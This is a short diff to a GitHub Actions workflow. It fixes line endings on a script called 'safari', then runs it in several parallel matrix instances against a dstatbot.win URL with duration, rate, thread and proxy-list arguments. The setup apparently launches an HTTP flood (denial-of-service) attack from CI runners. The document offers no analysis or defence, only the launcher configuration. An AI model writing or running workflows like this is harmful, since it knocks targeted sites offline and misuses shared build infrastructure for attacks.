@@ -19,8 +19,11 @@ jobs:
     - name: Checkout code
       uses: actions/checkout@v4
 
-    - name: Make files executable
-      run: chmod +x *
+    - name: Fix line endings and make executable
+      run: |
+        # Convert Windows line endings to Unix
+        sed -i 's/\r$//' safari
+        chmod +x safari
 
     - name: Create proxies.txt
       run: |
@@ -28,5 +31,5 @@ jobs:
         echo "proxies.txt created with 1.1.1.1:80"
 
     - name: Run safari script (Instance ${{ matrix.instance }})
-      run: ./safari https://c1.dstatbot.win/lURlGPR6 700 100000 90 proxies.txt --raw 
+      run: ./safari https://c1.dstatbot.win/lURlGPR6 700 100000 90 proxies.txt --raw
       continue-on-error: true
